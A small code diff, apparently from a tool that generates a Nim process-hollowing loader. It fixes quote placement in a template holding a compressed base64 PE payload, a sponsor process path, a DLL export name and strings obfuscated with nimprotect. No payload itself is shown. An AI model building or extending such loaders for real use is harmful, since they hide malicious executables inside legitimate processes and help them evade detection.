@@ -103,10 +103,10 @@ when isMainModule:
 import os
 import nimprotect
 
-var compressedBase64PE* = protectString("{compressedBase64PE})"
+var compressedBase64PE* = protectString("{compressedBase64PE}")
 var sponsorPath* = {sponsorPath}
-var sponsorParams* = protectString(" {sponsorParams})"
-var dllExportName* = protectString("{outDllExportName})" 
+var sponsorParams* = protectString(" {sponsorParams}")
+var dllExportName* = protectString("{outDllExportName}") 
 var sleepSeconds* = {sleepSeconds}
     """
     writeFile(paramsPath, paramsToHollower)
